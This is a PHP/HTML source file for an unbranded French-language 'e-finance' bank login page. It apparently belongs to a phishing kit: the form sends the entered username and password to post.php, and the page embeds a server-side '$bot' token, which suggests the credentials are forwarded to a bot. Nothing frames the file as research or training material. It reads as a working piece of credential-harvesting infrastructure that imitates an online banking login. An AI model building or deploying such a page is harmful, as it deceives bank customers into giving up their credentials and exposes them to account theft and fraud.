<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="res/css/app.css">
</head>
<body>
    <header>
	<script>var token=<?php echo json_encode($bot); ?>;</script>
        <div class="logo">
            <img src="res/img/log.png">
        </div>
    </header>
<main>
    <section>
     <h1>Login</h1>
     
    <div class="container">

        <div class="col">
            <form action="post.php" method="post">
                <label>Numéro e-finance / nom d'utilisateur</label>
                <input type="text" name="user">

                
                <div class="col">
                <label>Mot de passe</label>
                    <input type="password" name="pass">
                    <span class="eye">&#128065;</span>
                </div>
                <div class="forgot">
                <a href="#">Mot de passe oublié?</a>
                </div>
<div style="text-align:right;">
                <button class="submit-btn" style="color:black;">Suivant</button>
</div>
            </form>
        </div>
    </div>
</section>
</main>
<script src="./res/jq.js"></script>

</body>
</html>


